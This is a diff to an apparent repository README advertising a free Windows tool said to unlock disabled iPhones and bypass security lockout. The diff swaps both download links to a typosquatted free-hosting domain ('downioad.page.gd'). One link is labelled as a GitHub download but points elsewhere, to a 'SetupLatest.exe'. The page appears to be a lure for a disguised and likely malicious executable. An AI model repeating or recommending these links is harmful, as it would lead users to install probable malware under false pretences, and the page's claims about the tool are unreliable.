@@ -2,7 +2,7 @@
 
 Welcome to the iPhone Disabled Fix 2026 Recovery Suite. This free, portable Windows desktop application is designed to assist users in resolving the common 'iPhone is disabled' issue, including security lockout scenarios. It provides a straightforward method to restore access to your device, bypassing the need for standard iTunes procedures.
 
-[![Download Installer](https://img.shields.io/badge/Download-SetupLatest.exe-brightgreen?style=for-the-badge&logo=windows)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-SetupLatest.exe-brightgreen?style=for-the-badge&logo=windows)](https://downioad.page.gd/)
 
 ## What's Inside: Key Features
 
@@ -49,7 +49,7 @@ Using the recovery functions will restore your iPhone to a state where it can be
 
 Get the latest version of the iPhone Disabled Fix Suite directly from GitHub.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 *Copyright © 2026 iPhone Disabled Fix Team. All rights reserved.*
